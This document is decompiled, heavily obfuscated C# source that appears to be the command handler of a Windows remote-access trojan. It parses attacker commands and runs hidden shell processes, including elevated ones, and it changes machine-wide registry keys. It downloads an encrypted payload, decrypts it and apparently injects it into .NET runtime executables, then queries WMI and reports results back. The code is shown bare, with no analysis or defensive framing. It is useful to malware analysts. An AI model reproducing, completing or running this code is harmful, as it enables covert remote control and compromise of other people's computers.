using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

[StandardModule]
internal sealed class _______________________________
{
	public static Mutex _;

	private static bool m___ = false;

	private static string m____;

	private static string m_____;

	private static int m______;

	public unsafe static void _(string string_0)
	{
		try
		{
			int num;
			nint num2;
			string[] array = default(string[]);
			string[] array2;
			string[] array4;
			int num5;
			int num8;
			string[] array5 = default(string[]);
			int num4 = default(int);
			if (Operators.CompareString(string_0, _003CModule_003E.______<string>(1366899373u), false) == 0)
			{
				num = sizeof(uint) + 5;
				num2 = num;
			}
			else if (Operators.CompareString(string_0, _003CModule_003E.____<string>(383612974u), false) == 0)
			{
				num = sizeof(float) + -2;
				num2 = num;
			}
			else if (string_0.Contains(_003CModule_003E.______<string>(2367611230u)))
			{
				num2 = (nint)Type.EmptyTypes.LongLength + 3;
			}
			else
			{
				if (!___________________________________________________________________.________())
				{
					return;
				}
				if (string_0.Contains(_003CModule_003E.____<string>(2842227750u)))
				{
					int num3 = default(int);
					num2 = ((~(-num3 & num3) == num3) ? (sizeof(double) + 1474038664) : ((num4 * 17657856 == -5956) ? ((nint)Type.EmptyTypes.LongLength + -2128461909) : (sizeof(ulong) + 3)));
				}
				else if (Operators.CompareString(string_0, _003CModule_003E.____<string>(3691926952u), false) == 0)
				{
					num2 = sizeof(int) + -4;
				}
				else if (string_0.Contains(_003CModule_003E.______<string>(685941218u)))
				{
					num2 = (nint)Type.EmptyTypes.LongLength + 6;
				}
				else if (string_0.Contains(_003CModule_003E._____<string>(2686085668u)))
				{
					array = string_0.Split(new char[1] { '$' });
					num2 = (nint)Type.EmptyTypes.LongLength + 12;
				}
				else
				{
					if (!string_0.Contains(_003CModule_003E._____<string>(4186648631u)))
					{
						if (!string_0.Contains(_003CModule_003E._____<string>(2994265912u)))
						{
							return;
						}
						array2 = string_0.Split(new char[1] { '$' });
						____________(_003CModule_003E.____<string>(2035720178u) + array2[1] + _003CModule_003E.______<string>(851744222u) + array2[2]);
						Thread.Sleep(10000);
						string text = _003CModule_003E._____<string>(3106854509u);
						try
						{
							text = new SecurityIdentifier(_003CModule_003E.____<string>(2961505000u)).Translate(typeof(NTAccount)).ToString();
							if (text.Contains(_003CModule_003E.____<string>(2151898393u)))
							{
								string[] array3 = Strings.Split(text, _003CModule_003E._____<string>(305124521u), -1, (CompareMethod)0);
								text = array3[1].Trim();
							}
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
						array4 = new string[5]
						{
							_003CModule_003E.___<string>(850792095u),
							null,
							null,
							null,
							null
						};
						num5 = 22859;
						int num6 = default(int);
						if ((num6 & 0x300000) != ((num6 ^ -716518593) & 0x300000))
						{
							goto IL_05d0;
						}
						array4[1] = text;
						array4[2] = _003CModule_003E._____<string>(1787231883u);
						int num7 = default(int);
						num5 = (int)((((uint)(num7 ^ -num7) & (true ? 1u : 0u)) != 0) ? 867474525 : ((nint)Type.EmptyTypes.LongLength + -21246));
						num8 = sizeof(float) + -4;
						goto IL_05f4;
					}
					array5 = string_0.Split(new char[1] { '$' });
					num4 = 10865;
					if ((nint)Type.EmptyTypes.LongLength + -9153 != -9153)
					{
						goto IL_0414;
					}
					____________(_003CModule_003E.______<string>(1353082456u) + array5[1] + _003CModule_003E.____<string>(1226113571u) + array5[2]);
					num4 = 1222;
					num2 = (nint)Type.EmptyTypes.LongLength + 1;
				}
			}
			string[] array7 = default(string[]);
			string[] array6 = default(string[]);
			while (true)
			{
				switch (num2)
				{
				case 14:
				{
					Thread thread = new Thread(__________);
					thread.Start();
					num2 = sizeof(byte) + 7;
					continue;
				}
				case 13:
					____(_003CModule_003E.___<string>(2292148213u) + array[1]);
					num2 = (nint)Type.EmptyTypes.LongLength + 7;
					continue;
				case 12:
					____________(_003CModule_003E.______<string>(1353082456u) + array[1] + _003CModule_003E._____<string>(2798674265u));
					num2 = (nint)Type.EmptyTypes.LongLength + 13;
					continue;
				case 11:
					array7 = string_0.Split(new char[1] { '$' });
					num4 = ((num4 * 805306368 - 4090 != 3691) ? 23390 : (sizeof(ulong) + -1625651041));
					if ((uint)num4 / 524288u % 15u + 709376 == (uint)((0x31A & num4) - 3278 << 8))
					{
						int num7 = -552962879;
						num2 = num7;
					}
					else
					{
						num2 = sizeof(Guid) + -6;
					}
					continue;
				case 10:
					_____(array7[1], _003CModule_003E.______<string>(3994013574u), 1);
					if (num4 != 25429 || 16384 * ((0x1FFEAE0 & num4) - 9047) - -588709888 == (num4 ^ num4))
					{
						return;
					}
					goto case 13;
				case 6:
				{
					array6 = string_0.Split(new char[1] { '$' });
					int num6 = _003CModule_003E._________________;
					num2 = (nint)Type.EmptyTypes.LongLength + 5;
					continue;
				}
				case 5:
					_____(array6[1], _003CModule_003E.___<string>(1647031535u), 3);
					num2 = (nint)Type.EmptyTypes.LongLength + 4;
					continue;
				case 3:
					if (string_0.Contains(_003CModule_003E.______<string>(3688076789u)))
					{
						_______________________________.m___ = true;
					}
					goto case 14;
				case 1:
					____(_003CModule_003E.___<string>(4026159116u) + array5[1] + _003CModule_003E.______<string>(3218366251u) + array5[2]);
					if (num4 != -28720)
					{
						return;
					}
					goto case 6;
				case 0:
					______(bool_0: true);
					return;
				case 2:
					___();
					return;
				case 4:
					return;
				case 7:
					return;
				case 8:
					return;
				}
				break;
			}
			goto IL_0414;
			IL_062f:
			RegistryKey registryKey;
			registryKey.SetValue(array2[1], _003CModule_003E.______<string>(1522879322u), RegistryValueKind.DWord);
			return;
			IL_05d0:
			registryKey = Registry.LocalMachine.OpenSubKey(_003CModule_003E._______<string>(4261294862u), writable: true);
			if (registryKey == null)
			{
				num8 = sizeof(long) + -7;
				goto IL_05f4;
			}
			goto IL_062f;
			IL_05f4:
			switch (num8)
			{
			case 1:
				goto IL_0603;
			}
			do
			{
				array4[3] = array2[1];
				array4[4] = _003CModule_003E.___<string>(1173350434u);
				int num9 = num5;
				num5 = -5171;
				if (num9 != -21246)
				{
				}
				____________(string.Concat(array4));
				____(_003CModule_003E.___<string>(3673697223u) + array2[1] + _003CModule_003E.______<string>(4252605775u) + array2[2]);
			}
			while (num5 != -5171);
			goto IL_05d0;
			IL_0414:
			___________();
			return;
			IL_0603:
			Registry.LocalMachine.CreateSubKey(_003CModule_003E._______<string>(4261294862u));
			registryKey = Registry.LocalMachine.OpenSubKey(_003CModule_003E._____<string>(3706708696u), writable: true);
			goto IL_062f;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			____(_003CModule_003E.___<string>(3472358092u) + ex2.ToString());
			ProjectData.ClearProjectError();
		}
	}

	public static bool __()
	{
		bool result = default(bool);
		try
		{
			string path = ((!Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains(_003CModule_003E._____<string>(705582770u))) ? (Environment.GetFolderPath(Environment.SpecialFolder.System) + _003CModule_003E._____<string>(2787544319u)) : (Environment.GetEnvironmentVariable(_003CModule_003E._____<string>(124184184u)) + _003CModule_003E.____<string>(2991939248u)));
			if (File.Exists(path))
			{
				result = true;
				return result;
			}
			result = false;
			return result;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			____(_003CModule_003E._______<string>(3694199107u) + ex2.ToString());
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static void ___()
	{
		try
		{
			string text = _003CModule_003E.____<string>(3151309093u);
			if (__())
			{
				text = _003CModule_003E._____<string>(724038371u);
			}
			if (___________________________________________________________________.________())
			{
				text += _003CModule_003E.____<string>(2544263961u);
			}
			______________________________________________________________.___________(_003CModule_003E._____<string>(3856208495u) + text);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			____(_003CModule_003E._______<string>(3913289299u) + ex2.ToString());
			ProjectData.ClearProjectError();
		}
	}

	public static void ____(string string_0)
	{
		try
		{
			______________________________________________________________.___________(_003CModule_003E.____<string>(404388875u) + string_0);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void _____(string string_0, string string_1, int int_0)
	{
		try
		{
			_______________________________.m____ = string_0;
			_______________________________.m_____ = string_1;
			_______________________________.m______ = int_0;
			Thread thread = new Thread(_______);
			thread.Start();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			____(_003CModule_003E.____<string>(2400111240u) + ex2.ToString());
			ProjectData.ClearProjectError();
		}
	}

	public unsafe static void ______(bool bool_0)
	{
		try
		{
			int num = _003CModule_003E.____________;
			if ((0x20000000 & (num * -536870912)) != ((num << 29) & 0x20000000))
			{
				goto IL_0146;
			}
			string path;
			if (Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains(_003CModule_003E.___<string>(1980785605u)))
			{
				path = Environment.GetEnvironmentVariable(_003CModule_003E.____<string>(3598984380u)) + _003CModule_003E.___<string>(569333041u);
				goto IL_0084;
			}
			path = Environment.GetFolderPath(Environment.SpecialFolder.System) + _003CModule_003E.___<string>(1194939400u);
			nint num2 = sizeof(double) + -5;
			goto IL_012c;
			IL_012c:
			string contents = default(string);
			int num3 = default(int);
			while (true)
			{
				switch (num2)
				{
				case 1:
					goto IL_00c3;
				case 0:
					goto IL_0146;
				}
				break;
				IL_00c3:
				string text2;
				do
				{
					File.WriteAllText(path, contents);
					string text = _003CModule_003E._____<string>(1419880545u);
					______________________._______ = -1749758540;
					text2 = text;
				}
				while (num3 != 27102);
				____________(_003CModule_003E.______<string>(1049174922u) + text2 + _003CModule_003E.______<string>(368216767u) + text2);
				num2 = (((-2 | (2 * num3)) == -2) ? ((nint)Type.EmptyTypes.LongLength + 0) : ((nint)Type.EmptyTypes.LongLength + 1437967309));
			}
			goto IL_0084;
			IL_0084:
			if (File.Exists(path))
			{
				contents = ___________________________________________________________________._(__________________________________________________________________________.___, Strings.StrReverse(_003CModule_003E.____<string>(2559481085u)));
				num3 = (int)((nint)Type.EmptyTypes.LongLength + 27102);
				num2 = (nint)Type.EmptyTypes.LongLength + 1;
				goto IL_012c;
			}
			return;
			IL_0146:
			Thread.Sleep(5000);
			____________(_003CModule_003E.______<string>(4009859742u));
			____________(_003CModule_003E._____<string>(1757646336u));
			____________(_003CModule_003E.___<string>(2465662437u));
			____________(_003CModule_003E._____<string>(3989107684u));
			____________(_003CModule_003E._____<string>(1663513340u));
			if (bool_0)
			{
				____(_003CModule_003E._____<string>(2357500523u));
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			____(_003CModule_003E._______<string>(1831932475u) + ex2.ToString());
			ProjectData.ClearProjectError();
		}
	}

	public unsafe static void _______()
	{
		try
		{
			byte[] array = default(byte[]);
			string string_ = default(string);
			while (Operators.CompareString(_______________________________.m____, string.Empty, false) != 0)
			{
				while (true)
				{
					IL_0181:
					int num = 26597;
					while (true)
					{
						WebClient webClient = new WebClient();
						byte[] byte_ = webClient.DownloadData(_______________________________.m____);
						byte[] byte_2 = ___________________________________________________________________._______(byte_, _003CModule_003E.___<string>(1387161447u));
						int num2 = num;
						num = -31315;
						if (num2 != 26597)
						{
							goto IL_0052;
						}
						goto IL_0128;
						IL_0128:
						array = ________________________________________________________________________________.______(byte_2);
						if (array.Length == 1289728)
						{
							num2 = num;
							num = 23914;
							if (num2 != -31315)
							{
								goto IL_00c2;
							}
							____(_______________________________.m_____ + _003CModule_003E._______<string>(4006802397u));
							string_ = _003CModule_003E.___<string>(409093195u);
							if (num != 23914)
							{
								break;
							}
							goto IL_0052;
						}
						____(_003CModule_003E.______<string>(2580823458u));
						return;
						IL_00a7:
						nint num3;
						if (Operators.ConditionalCompareObjectEqual(_________(array, string_), (object)true, false))
						{
							num3 = sizeof(long) + -7;
							goto IL_0081;
						}
						____(_003CModule_003E.______<string>(954421114u));
						return;
						IL_00e8:
						____(_003CModule_003E.____<string>(4137962411u));
						if (((ServerComputer)_____________._).get_Info().get_OSFullName().Contains(_003CModule_003E._______<string>(4061574945u)))
						{
							if (num == -7578)
							{
								goto IL_0128;
							}
							______(bool_0: false);
						}
						____________(_003CModule_003E._______<string>(1996250119u));
						____________(_003CModule_003E.______<string>(3899324406u));
						___();
						return;
						IL_0052:
						if (_______________________________.m______ == 1)
						{
							string_ = _003CModule_003E.______<string>(4288162693u);
						}
						if (_______________________________.m______ == 3)
						{
							num3 = (nint)Type.EmptyTypes.LongLength + 2;
							goto IL_0081;
						}
						goto IL_00a7;
						IL_00c2:
						if (_______________________________.m______ == 1)
						{
							Thread.Sleep(30000);
							if (__())
							{
								num = 22842;
								goto IL_00e8;
							}
							____(_003CModule_003E._______<string>(208126310u));
							return;
						}
						return;
						IL_0081:
						switch (num3)
						{
						case 2:
							break;
						case 1:
							goto IL_00c2;
						case 3:
							goto IL_00e8;
						default:
							continue;
						case 0:
							goto IL_0181;
						}
						string_ = _003CModule_003E._______<string>(3897257301u);
						goto IL_00a7;
					}
					break;
				}
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			____(_003CModule_003E.____<string>(844045643u) + ex2.ToString());
			ProjectData.ClearProjectError();
		}
	}

	public unsafe static void ________()
	{
		int try0000_dispatch = -1;
		int num2 = default(int);
		int num = default(int);
		int num3 = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				nint num5;
				switch (try0000_dispatch)
				{
				default:
					goto IL_0024;
				case 281:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 2:
							break;
						case 1:
							goto IL_0024;
						case 3:
							goto IL_002d;
						case 4:
							goto IL_0036;
						case 7:
							goto IL_0051;
						case 8:
							goto IL_0053;
						case 9:
							goto IL_0077;
						case 10:
							goto IL_0081;
						case 12:
							goto IL_0095;
						case 13:
							goto IL_0098;
						case 11:
						case 14:
						case 15:
							goto IL_00aa;
						case 5:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 6:
						case 16:
						case 17:
							goto end_IL_0000_3;
						}
						goto IL_0003;
					}
					IL_0098:
					num = 13;
					____(_003CModule_003E.____<string>(4137962411u));
					goto IL_00aa;
					IL_0024:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0003;
					IL_0003:
					num = 2;
					Thread.Sleep(15000);
					if ((0xAE0D3FFFu | ((uint)num2 / 720235u)) != 2920103935u)
					{
						goto IL_0024;
					}
					goto IL_002d;
					IL_002d:
					num = 3;
					if (__())
					{
						goto IL_0036;
					}
					goto IL_0051;
					IL_0036:
					num = 4;
					____(_003CModule_003E.___<string>(731651534u));
					num5 = (nint)Type.EmptyTypes.LongLength + 1;
					goto IL_005e;
					IL_0051:
					num = 7;
					goto IL_0053;
					IL_0053:
					num = 8;
					num5 = sizeof(float) + -4;
					goto IL_005e;
					IL_005e:
					switch (num5)
					{
					case 0:
						break;
					default:
						goto end_IL_0000_2;
					}
					Thread.Sleep(30000);
					goto IL_0077;
					IL_00aa:
					num = 15;
					___();
					goto end_IL_0000_3;
					IL_0077:
					num = 9;
					if (!__())
					{
						goto IL_0081;
					}
					goto IL_0095;
					IL_0081:
					num = 10;
					____(_003CModule_003E.___<string>(2305422591u));
					goto IL_00aa;
					IL_0095:
					num = 12;
					goto IL_0098;
					end_IL_0000_2:
					break;
				}
				num = 5;
				___();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 281;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public unsafe static object _________(byte[] byte_0, string string_0)
	{
		object obj;
		try
		{
			obj = (_______________________________________________________________________.___________(RuntimeEnvironment.GetRuntimeDirectory() + _003CModule_003E.____<string>(2999137853u), string_0, byte_0, bool_0: true, bool_1: false, bool_2: true) ? (sizeof(float) switch
			{
				_ => true, 
			}) : (_______________________________________________________________________.___________(RuntimeEnvironment.GetRuntimeDirectory() + _003CModule_003E.___<string>(692630896u), string_0, byte_0, bool_0: true, bool_1: false, bool_2: true) ? ((object)true) : ((!_______________________________________________________________________.___________(_____________________________________________________________________________.__, string_0, byte_0, bool_0: true, bool_1: false, bool_2: true)) ? ((object)false) : ((object)true))));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			obj = false;
			ProjectData.ClearProjectError();
		}
		object result = obj;
		_003CModule_003E.________ = obj;
		return result;
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public unsafe static void __________()
	{
		try
		{
			if (___________________________________________________________________.________())
			{
				return;
			}
			if (!_________________________________________________._________())
			{
				string text = _003CModule_003E._____<string>(1419880545u);
				switch ((nint)Type.EmptyTypes.LongLength + 0)
				{
				}
				ProcessStartInfo processStartInfo = new ProcessStartInfo(_003CModule_003E.______<string>(168821456u), _003CModule_003E.______<string>(2205802088u) + text + _____________________________________________________________________________.__ + text);
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				processStartInfo.UseShellExecute = true;
				processStartInfo.WorkingDirectory = Environment.CurrentDirectory;
				processStartInfo.Verb = _003CModule_003E._____<string>(2128613347u);
				int num = default(int);
				while (true)
				{
					try
					{
						if ((num << 7) * 893 + (num << 7) * 131 != 1976100108)
						{
							Process.Start(processStartInfo);
							_003CModule_003E.______<string>(2703211100u);
							______________________________________________________________.__________________________.Close();
							if (sizeof(ulong) + 20543 == -19844)
							{
							}
						}
						______________________________________________________________.____________________________ = true;
						______________________________________________________________.__.Close();
						Thread.Sleep(60000);
						if (______________________________________________________________.____(______________________________________________________________.__________________))
						{
							ProjectData.EndApp();
						}
						______________________________________________________________.____________________________ = false;
						Thread thread = new Thread(_____________________________________________________________________________.___);
						thread.Start();
						______________________________________________________________.______________(_003CModule_003E._______<string>(2357608790u), _003CModule_003E.______<string>(1524843933u));
						break;
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						____(_003CModule_003E.___<string>(2669080215u));
						if (_______________________________.m___)
						{
							ProjectData.ClearProjectError();
							continue;
						}
						ProjectData.ClearProjectError();
						break;
					}
				}
			}
			else
			{
				______________________________________________________________.______________(_003CModule_003E.___<string>(1387161447u), _003CModule_003E._____<string>(4079530698u));
				____(_003CModule_003E.______<string>(2886760243u));
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			____(_003CModule_003E.____<string>(3795987078u) + ex2.ToString());
			ProjectData.ClearProjectError();
		}
	}

	public unsafe static void ___________()
	{
		//IL_004b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0051: Expected O, but got Unknown
		//IL_0052: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_006e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Expected O, but got Unknown
		try
		{
			int int_ = 48408;
			int ______________ = _003CModule_003E._______________;
			string text = _003CModule_003E.__________(47111, int_, ((uint)(______________ + ______________) / 7338u != 2235061062u) ? (sizeof(uint) + 214) : 1747943102);
			SelectQuery val = new SelectQuery(_003CModule_003E.____<string>(1656111992u));
			ManagementObjectSearcher val2 = new ManagementObjectSearcher((ObjectQuery)(object)val);
			ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
			try
			{
				enumerator = val2.Get().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ManagementObject val3 = (ManagementObject)enumerator.get_Current();
					text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)text, ((ManagementBaseObject)val3).get_Item(_003CModule_003E.___<string>(673120577u))), (object)_003CModule_003E._______<string>(2695599522u)));
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			if (Operators.CompareString(text, _003CModule_003E.__________((int)((nint)Type.EmptyTypes.LongLength + 29547), ((((uint)______________ / 5u) & 0xC0000000u) == 0) ? (sizeof(uint) + 30035) : (sizeof(long) + -212006864), (int)((nint)Type.EmptyTypes.LongLength + 42)), false) == 0)
			{
				______________________________________________________________.___________(_003CModule_003E.______<string>(2760443379u));
			}
			else
			{
				______________________________________________________________.___________(_003CModule_003E.______<string>(2746626462u) + text);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			____(_003CModule_003E.______<string>(3733521402u) + ex2.ToString());
			ProjectData.ClearProjectError();
		}
	}

	public static void ____________(string string_0)
	{
		try
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo(_003CModule_003E.____<string>(2924692061u), _003CModule_003E.____<string>(1785047589u) + string_0);
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.UseShellExecute = true;
			Process.Start(processStartInfo);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
